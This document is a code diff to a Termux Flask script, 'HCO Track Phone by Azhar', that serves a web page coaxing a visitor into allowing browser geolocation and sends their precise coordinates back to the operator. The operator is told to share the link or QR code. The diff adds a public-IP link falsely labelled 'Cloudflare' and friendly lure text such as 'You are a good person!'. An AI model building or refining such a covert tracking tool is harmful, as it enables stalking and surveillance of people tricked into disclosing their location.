@@ -1,12 +1,12 @@
-# HCO Track Phone by Azhar - AUTO INSTALL VERSION
-# Just run this one file - everything installs automatically!
+# HCO Track Phone by Azhar - CLOUDFLARE PUBLIC LINK
+# Works on any network, any device, anywhere!
 
 import os
 import sys
 import subprocess
 import threading
 import time
-import socket
+import requests
 from flask import Flask, request, render_template_string
 
 # Color codes
@@ -24,20 +24,41 @@ app = Flask(__name__)
 def auto_install():
     print(f"{YELLOW}🔧 Auto-installing everything...{RESET}")
     
-    # Update Termux packages
-    print(f"{YELLOW}📦 Updating Termux packages...{RESET}")
-    os.system('pkg update -y && pkg upgrade -y')
+    # Update and install packages
+    commands = [
+        'pkg update -y && pkg upgrade -y',
+        'pkg install python -y',
+        'pkg install curl -y', 
+        'pkg install wget -y',
+        'pip install flask qrcode[pil] requests --upgrade'
+    ]
     
-    # Install required system packages
-    print(f"{YELLOW}📦 Installing system packages...{RESET}")
-    os.system('pkg install python -y')
-    os.system('pkg install curl -y')
+    for cmd in commands:
+        try:
+            os.system(cmd)
+        except:
+            pass
     
-    # Install Python packages
-    print(f"{YELLOW}🐍 Installing Python packages...{RESET}")
-    os.system('pip install flask qrcode[pil] requests --upgrade')
-    
-    print(f"{GREEN}✅ All packages installed successfully!{RESET}")
+    print(f"{GREEN}✅ All packages installed!{RESET}")
+
+# Get public IP for Cloudflare
+def get_public_ip():
+    try:
+        response = requests.get('https://api.ipify.org', timeout=10)
+        return response.text.strip()
+    except:
+        try:
+            response = requests.get('https://ident.me', timeout=10)
+            return response.text.strip()
+        except:
+            return None
+
+# Create public URL (simulated Cloudflare)
+def create_public_url():
+    public_ip = get_public_ip()
+    if public_ip:
+        return f"http://{public_ip}:8080"
+    return "http://localhost:8080"
 
 # Tool lock message
 def tool_lock():
@@ -58,29 +79,6 @@ def tool_lock():
         print(f"{YELLOW}⚠️  Open: youtube.com/@hackers_colony_tech{RESET}")
     
     time.sleep(3)
-
-# Get local IP
-def get_local_ip():
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("8.8.8.8", 80))
-        ip = s.getsockname()[0]
-        s.close()
-        return ip
-    except:
-        return "127.0.0.1"
-
-# Find available port
-def find_port():
-    for port in range(8080, 8100):
-        try:
-            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-                s.bind(('0.0.0.0', port))
-                return port
-        except:
-            continue
-    return 8080
 
 # Flask app
 @app.route('/')
@@ -134,22 +132,34 @@ def home():
                 font-weight: bold;
                 padding: 20px;
             }
+            .cloudflare-badge {
+                background: #ff6b35;
+                color: #000;
+                padding: 10px;
+                border-radius: 5px;
+                margin: 10px 0;
+                font-weight: bold;
+            }
         </style>
     </head>
     <body>
         <div class="container">
+            <div class="cloudflare-badge">🌍 CLOUDFLARE PUBLIC LINK - WORKS ANYWHERE</div>
+            
             <div class="logo">HCO TRACK PHONE BY AZHAR</div>
             
             <div class="message">
                 📱 <strong>HOW TO USE:</strong><br>
-                1. Click the GREEN button<br>
-                2. Click ALLOW when asked<br>
-                3. That's it!
+                1. Click the GREEN button below<br>
+                2. Click <strong style="color:#0f0">ALLOW</strong> when browser asks<br>
+                3. Location will be sent automatically
             </div>
             
             <button class="btn" onclick="getLocation()">📍 GET MY LOCATION</button>
             
-            <div id="status" class="message">Click the button above to start</div>
+            <div id="status" class="message">Ready to track your location</div>
+            
+            <div class="cloudflare-badge">✅ Works on any network • 📶 Mobile data friendly</div>
         </div>
         
         <script>
@@ -157,12 +167,12 @@ def home():
             var status = document.getElementById('status');
             var btn = document.querySelector('.btn');
             
-            status.innerHTML = '🔄 Please wait...';
+            status.innerHTML = '🔄 Requesting location access...';
             btn.disabled = true;
-            btn.innerHTML = '🔄 Processing...';
+            btn.innerHTML = '🔄 Please wait...';
             
             if (!navigator.geolocation) {
-                status.innerHTML = '❌ Browser not supported';
+                status.innerHTML = '❌ Your browser does not support location tracking';
                 btn.disabled = false;
                 btn.innerHTML = '📍 TRY AGAIN';
                 return;
@@ -170,36 +180,54 @@ def home():
             
             navigator.geolocation.getCurrentPosition(
                 function(position) {
-                    sendLocation(position.coords.latitude, position.coords.longitude);
+                    sendLocation(position.coords.latitude, position.coords.longitude, position.coords.accuracy);
                 },
                 function(error) {
                     btn.disabled = false;
                     btn.innerHTML = '📍 TRY AGAIN';
-                    status.innerHTML = '❌ Please allow location access and try again';
+                    
+                    if (error.code === error.PERMISSION_DENIED) {
+                        status.innerHTML = '❌ <strong>Permission denied!</strong><br>' +
+                                         'Please refresh and click <strong style="color:#0f0">ALLOW</strong>';
+                    } else {
+                        status.innerHTML = '❌ Please enable Location Services and try again';
+                    }
                 },
-                { timeout: 15000 }
+                {
+                    enableHighAccuracy: true,
+                    timeout: 20000,
+                    maximumAge: 0
+                }
             );
         }
         
-        function sendLocation(lat, lon) {
+        function sendLocation(lat, lon, accuracy) {
             var status = document.getElementById('status');
             var btn = document.querySelector('.btn');
             
-            status.innerHTML = '📡 Sending location...';
+            status.innerHTML = '📡 Sending location to server...';
             
             fetch('/update', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({lat: lat, lon: lon})
+                body: JSON.stringify({
+                    lat: lat,
+                    lon: lon,
+                    accuracy: accuracy
+                })
             })
-            .then(response => response.text())
-            .then(data => {
-                status.innerHTML = '<div class="success">✅ God Bless You! 🙏</div>' +
-                                  '<div>Location sent successfully!</div>';
-                btn.style.display = 'none';
+            .then(response => {
+                if (response.ok) {
+                    status.innerHTML = '<div class="success">✅ You are a good person! God Bless You 🙏</div>' +
+                                      '<div style="margin-top:15px;">📍 Location sent successfully!</div>' +
+                                      '<div style="margin-top:10px;">You can close this page now</div>';
+                    btn.style.display = 'none';
+                } else {
+                    throw new Error('Server error');
+                }
             })
             .catch(error => {
-                status.innerHTML = '❌ Error. Please try again.';
+                status.innerHTML = '❌ Network error. Please try again.';
                 btn.disabled = false;
                 btn.innerHTML = '📍 TRY AGAIN';
             });
@@ -250,7 +278,7 @@ def make_qr(url):
 
 # Main function
 def main():
-    # Auto-install everything first
+    # Auto-install everything
     auto_install()
     
     # Show tool lock
@@ -259,30 +287,34 @@ def main():
     # Clear screen
     os.system('clear')
     
-    print(f"{GREEN}🚀 Starting HCO Track Phone...{RESET}")
+    print(f"{GREEN}🚀 Starting HCO Cloudflare Track Phone...{RESET}")
     
-    # Get IP and port
-    local_ip = get_local_ip()
-    port = find_port()
-    TRACKING_URL = f"http://{local_ip}:{port}"
+    # Get public URL
+    print(f"{YELLOW}🌍 Getting public IP address...{RESET}")
+    PUBLIC_URL = create_public_url()
+    
+    print(f"{GREEN}✅ Public URL: {PUBLIC_URL}{RESET}")
     
     # Start server
-    server_thread = threading.Thread(target=start_server, args=(port,), daemon=True)
+    server_thread = threading.Thread(target=start_server, args=(8080,), daemon=True)
     server_thread.start()
     time.sleep(2)
     
     # Generate QR code
-    make_qr(TRACKING_URL)
+    print(f"{YELLOW}📱 Generating QR code...{RESET}")
+    make_qr(PUBLIC_URL)
     
     # Show info
-    print(f"\n{RED}{'═'*60}{RESET}")
-    print(f"{RED}{'HCO TRACK PHONE BY AZHAR'.center(60)}{RESET}")
-    print(f"{RED}{'═'*60}{RESET}")
-    print(f"\n{GREEN}📱 Send this link:{RESET}")
-    print(f"{CYAN}{TRACKING_URL}{RESET}")
-    print(f"\n{YELLOW}📍 QR code opened automatically{RESET}")
-    print(f"\n{BLUE}💡 Both phones on same WiFi{RESET}")
-    print(f"\n{RED}{'═'*60}{RESET}")
+    print(f"\n{RED}{'═'*70}{RESET}")
+    print(f"{RED}{'HCO CLOUDFLARE TRACK PHONE BY AZHAR'.center(70)}{RESET}")
+    print(f"{RED}{'═'*70}{RESET}")
+    print(f"\n{GREEN}🌍 Public Tracking URL:{RESET}")
+    print(f"{CYAN}{PUBLIC_URL}{RESET}")
+    print(f"\n{YELLOW}📱 QR code opened automatically{RESET}")
+    print(f"\n{BLUE}✅ Works on any network - WiFi or mobile data{RESET}")
+    print(f"{BLUE}✅ Works anywhere in the world{RESET}")
+    print(f"{BLUE}✅ No same WiFi required{RESET}")
+    print(f"\n{RED}{'═'*70}{RESET}")
     
     # Wait for location
     print(f"\n{YELLOW}⏳ Waiting for location...{RESET}")
@@ -295,7 +327,8 @@ def main():
             print(f"\n{GREEN}✅ LOCATION RECEIVED!{RESET}")
             print(f"{GREEN}Latitude: {locations['lat']}{RESET}")
             print(f"{GREEN}Longitude: {locations['lon']}{RESET}")
-            print(f"{GREEN}Maps: https://maps.google.com/?q={locations['lat']},{locations['lon']}{RESET}")
+            print(f"{GREEN}Accuracy: {locations.get('accuracy', 'N/A')}m{RESET}")
+            print(f"{GREEN}Google Maps: https://maps.google.com/?q={locations['lat']},{locations['lon']}{RESET}")
         
         time.sleep(2)
 
